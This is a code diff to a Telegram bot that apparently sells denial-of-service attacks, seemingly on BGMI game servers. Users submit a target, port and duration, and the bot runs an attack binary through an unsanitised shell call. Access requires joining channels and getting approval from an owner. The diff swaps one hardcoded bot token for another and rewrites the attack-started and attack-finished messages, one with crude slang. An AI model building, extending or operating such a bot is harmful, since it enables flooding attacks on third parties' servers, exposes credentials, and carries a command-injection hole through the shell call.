@@ -8,7 +8,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('8164182540:AAE4ElrfOQNXXHYoYG71_6JJBlxNDecNUoQ')
+bot = telebot.TeleBot('7242024865:AAFD6SVsYkfQP-l7Gv5DTtYd7tQp-iFSxGc')
 
 # Admin user IDs
 admin_id = ["7584228621"]
@@ -279,7 +279,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
+    response = f"{username}, 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗚 𝗚𝗬𝗔 𝗔𝗕 𝗥𝗘 𝗦𝗧𝗔𝗥𝗧 𝗞𝗔𝗥𝗟𝗘 𝗔𝗣𝗡𝗘 𝗔𝗣𝗣 𝗥𝗘-𝗝𝗢𝗜𝗡 𝗔𝗬𝗚𝗔.🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗡𝗜 𝗔𝗬𝗔 𝗧𝗢𝗛 𝗕𝗢𝗧 𝗚𝗔𝗡𝗗 𝗣𝗘 𝗟𝗔𝗔𝗧 𝗣𝗔𝗗𝗘𝗚𝗜"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -310,17 +310,18 @@ def handle_bgmi(message):
             if time > 241:
                 response = "Error: Time interval must be less than 240."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/golem', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./golem {target} {port} {time} 300"
+                full_command = f"./bgmi {target} {port} {time} 900"
                 process = subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐊𝐇𝐓𝐌 𝐇𝐎𝐆𝐘𝐀. Target: {target} Port: {port} Time: {time}\n\n𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗡𝗜 𝗔𝗬𝗔 𝗧𝗢𝗛 𝗕𝗢𝗧 𝗚𝗔𝗡𝗗 𝗣𝗘 𝗟𝗔𝗔𝗧 𝗣𝗔𝗗𝗘𝗚𝗜"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /golem <target> <port> <time>"  # Updated command syntax
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nJOIN BOTH CHANNELS TO GET FREE OR PAID ACCES \n\n @golemhacks AND @golemfeedbacks \n\n NOW SEND YOUR USER ID TO @GOLEM_OWNER FOR APPROVAL ")
+        response = ("🚫 Unauthorized Access! 🚫\n\n𝗗𝗢𝗡𝗢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗝𝗢𝗜𝗡 𝗞𝗔𝗥 𝗙𝗜𝗥 𝗚𝗢𝗟𝗘𝗠 𝗢𝗪𝗡𝗘𝗥 𝗞𝗢 𝗨𝗦𝗘𝗥 𝗜𝗗 𝗕𝗛𝗘𝗝
+ \n\n @golemhacks AND @golemfeedbacks \n\n @GOLEM_OWNER ")
 
     bot.reply_to(message, response)
 
